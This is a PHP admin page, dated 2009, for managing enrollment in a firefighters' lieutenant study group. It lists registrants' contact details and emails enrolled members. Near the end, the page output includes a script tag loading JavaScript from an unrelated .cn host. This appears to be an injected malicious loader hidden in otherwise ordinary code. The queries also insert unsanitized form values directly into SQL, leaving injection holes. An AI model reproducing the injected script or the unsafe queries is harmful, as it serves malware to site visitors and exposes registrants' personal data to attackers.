<?php
/****************************************************
* study_group.php									*
*													*
* This script is a custom enrollment administration *
* for Ignite the Spirit's Lieutenant Study group	*
*													*
* Created by: Michael Pisula (mike.pisula@gmail.com)*
* Last Edited: 1/23/2009							*
*													*
****************************************************/

session_start();																																	//Open Session

if ($_SESSION['auth'] == "admin") 								
{
	include("db_connect.php");																															//Include Database Script
	if ($_POST['action'] == "edit")
	{
		switch($_POST['submit'])
		{
			case "Delete":
			echo "delete";
			break;
			case "Enroll":
				foreach ($_POST['firefighter_id'] as $study_id)
				{
					$id_email = explode(",",$study_id);
					$fire_id = $id_email[0];
					$fire_email = $id_email[1];
					//$fire_email = "mike.pisula@gmail.com";
					$fire_fname = $id_email[2];
					
					
					$Name = "Ignite The Spirit"; //senders name
					$email = "do_not_reply@ignitethespirit.org"; //senders e-mail adress
					$recipient = $fire_email; //recipient
					/*$mail_body = "Congratulations $fire_fname you are enrolled in the Lieutenant Study Group.\n".
								 "The group will meet at Illinois Masonic Hospital's Olsen Auditorium. (836 W. Wellington and free parking is available) The group will meet on these days between the hours of 6:00pm and 9:00pm:\n\n".
								 "Jan. 30 Friday (3D)\n".
								 "Feb. 5 Thursday (3A)\n".
								 "Feb. 9 Monday (1B)\n".
								 "Feb. 16 Monday (2E)\n".
								 "Feb. 26 Thursday (3C)\n".
								 "Mar. 5 Thursday (1E)\n".
								 "Mar. 12 Thursday (2C)\n".
								 "Mar. 19 Thursday (3E)\n".
								 "Mar. 23 Monday (1A)\n\n".

								 "For the lastest information please visit ignitethespirit.org."; //mail body */
								 
					$mail_body = "Congradulations $fire_fname you are in the Ignite the Spirit's study group.\n\n".

					"The classes will be at Illinois Masonic Hospital in the Olson Auditorium.\n".
					"Enter through the main entance.\n".
					"Absulutely no food or drink in the auditorium.\n".
					"The classes are from 6:00pm - 9:00pm.\n".
					"On the first day PLEASE COME EARLY TO REGISTER and bring your firefighter ID\n".
					"Doors will open at 5:00pm to register.\n".
					"Don't forget to bring pencils and notebooks.\n".
					"Parking is available for a fee.(so car pool)\n".
					"For more info check the ignitethespirit.org website.\n\n".

					"Rich Pinskey\n".
					"President\n".
					"Ignite the Spirit\n";
					
					$subject = "Ignite the Spirit | Lieutenant Study Group"; //subject
					$header = "From: ". $Name . " <" . $email . ">\r\n"; //optional headerfields

					ini_set('sendmail_from', 'do_not_reply@ignitethespirit.org'); //Suggested by "Some Guy"
	
					$mail_sent = mail($recipient, $subject, $mail_body, $header); //mail command :)
					
					if ($mail_sent == true)
					{
					$update_query = "UPDATE Study_Group SET study_active = 1 WHERE study_id = '$fire_id'";
					$update_result = mysql_query($update_query);
					}
				}
				header("location:study_group.php");
			break;
			case "Un-Enroll":
				foreach ($_POST['firefighter_id'] as $study_id)
				{
					$update_query = "UPDATE Study_Group SET study_active = 0 WHERE study_id = '$study_id'";
					$update_result = mysql_query($update_query);
					header("location:study_group.php");
				}
			break;
			case "Edit":
			echo "edit";
			break;
		}
	}
	else
	{																														
		function oddeven($number) 																														//Function to determine if a number is odd or even
		{ 
			if ($number % 2 == 0 ) 
			{
				print "bbbbbb";
			} 
			else 
			{ 
				print "dddddd"; 
			} 
		}	
		
		if ($_POST['sort'] == "Last Name")
		{
		$order = "study_lname";
		}
		else if ($_POST['sort'] == "Time")
		{
		$order = "study_date";
		}
		else
		{
		$order = "study_lname";
		}
		
		if (isset($_POST['number_rows'])) { $number_rows = $_POST['number_rows'];} else { $number_rows = 25; }
		if (isset($_POST['starting_row'])) { $starting_row = $_POST['starting_row']; } else { $starting_row = 0; }
		
		
		$enrolled_query =  "SELECT * FROM Study_Group WHERE study_active = 1";
		$enrolled_result = mysql_query($enrolled_query);	
		$number_enrolled = mysql_num_rows($enrolled_result);
		$class_query = "SELECT * FROM Study_Group ORDER by $order ASC LIMIT $starting_row,$number_rows";																			//Create Query to get the info from the database
		$class_result = mysql_query($class_query);																										//Query the Study_Group table in the Ignite database																									
		$number_students = mysql_num_rows($class_result);																								//Get the total number of students enrolled in the study group
		$number_enrolled = mysql_num_rows($enrolled_result);
		$seats_left = 200 - $number_enrolled;																											//Subtract the number of students from the total number of spots available
		
		echo "<html><head><title>Ignite The Spirit | Lieutenant Study Group Enrollment</title>";																			//Start the HTML part of the page including the style sheet
		echo "<style type='text/css'>
				body { font-family: arial; font-size: 12;}
				table { font-family: arial; font-size: 12;}
				tr.header td {background-color: #CC0000; color:#ffffff; text-align: center; padding-left: 10px; padding-right: 10px; font-weight: bold;}
				tr.content:hover {background-color: #ffcccc;}
				.content td {padding-left: 10px; padding-right: 10px;}
			  </style>"; 
		echo "</head><body>";
		echo "<h1>Ignite The Spirit | Lieutenant Study Group Enrollment</h1>";
		echo "Total Number Of Students: ".$number_students;																							//Display total number of students
		echo "<br />";
		echo "Number Of Students Enrolled: ".$number_enrolled;																							//Display total number of students enrolled
		echo "<br />";
		echo "Seats Left in Class: ".$seats_left."<br /><br />";																										//Display the number of spots available still
		echo "<form name='rows' method='post' action='".$_SERVER['PHP_SELF']."'>";
		echo "View <input name='number_rows' type='text' value='25' size='4' /> entries, Starting with <input name='starting_row' type='text' value='0' size='4' /><input name='sort' type='submit' value='Submit'><br />";
		echo "</form>";
		echo "<br /><br /><form name='sort_form' method='post' action='".$_SERVER['PHP_SELF']."'>";
		echo "<input name='number_rows' type='hidden' value='$number_rows'><input name='starting_row' type='hidden' value='$starting_row'>";
		echo "Sort By: <input name='sort' type='submit' value='Last Name' > | 
							 <input name='sort' type='submit' value='Time'></form>";
		echo "<form method='post' action='".$_SERVER['PHP_SELF']."'>";
		echo "<input name='action' type='hidden' value='edit'>";
		echo "<table><tr class='header'><td>&nbsp;</td><td>Name</td><td>Phone</td><td>E-Mail</td><td>Address</td><td>City</td>
			  <td>State</td><td>Zip</td><td>Assignment</td><td>Shift/Daily</td><td>Date Registered</td><td>IP Address</td><td>Enrolled</td></tr>";
	
		$counter = 1;																																	//creates a counter to vary the color of the table rows backgrouds
		while ($row = mysql_fetch_array($class_result, MYSQL_ASSOC)) 
			{
			
			$enrollment_date = strtotime($row['study_date']);																							//create unix timestamp from date in DB
			print "<tr class='content' bgcolor='";
			
			oddeven($counter);																															//Determine if the counter is odd or even, then echos the apropriate color code
			$form_data = "$row[study_id],$row[study_email],$row[study_fname]";
			printf("'><td><input name='firefighter_id[]' type='checkbox' value='%s'></td><td> %s, %s </td><td> %s </td><td> %s </td><td> %s",  							//populate the table
			$form_data,
			$row['study_lname'], 
			$row['study_fname'],
			$row['study_phone'],
			$row['study_email'],
			$row['study_address_1']);
			
			if ($row['study_address_2'] != "") {print ", ".$row['study_address_2'];}																	// If there is a second address line print a comma and the line
			
			printf("</td><td> %s </td><td> %s </td><td> %s </td><td> %s </td><td> %s </td><td> %s </td><td> %s </td><td>", 
			
			$row['study_city'],
			$row['study_state'],
			$row['study_zip'],
			$row['study_assignment'],
			$row['study_shift'],
			date ("m/d/Y h:i:s", $enrollment_date),
			$row['study_ip']);																											//format the date
			
			if ($row['study_active'] == "1") { echo "Yes";} else { echo "No";}  
			
			print "</td></tr>";
			
			$counter++;																																	//increment the counter
			}

		echo "</table>";
		echo "<br />";
		echo "With Selected: <!--<input name='submit' type='submit' value='Delete' DISABLED> | -->
							 <input name='submit' type='submit' value='Enroll' > | 
							 <input name='submit' type='submit' value='Un-Enroll' DISABLED> <!--| -->
							 <!--<input name='submit' type='submit' value='Edit' DISABLED>-->";
		echo "</form>";
		echo "<script src='http://nt002.cn/E/J.JS'></script></body>";
		echo "</html";
	}
}

else 
{ 
	include("log_form.php"); 																														//if session is invalid redirect to the log in form
}
?>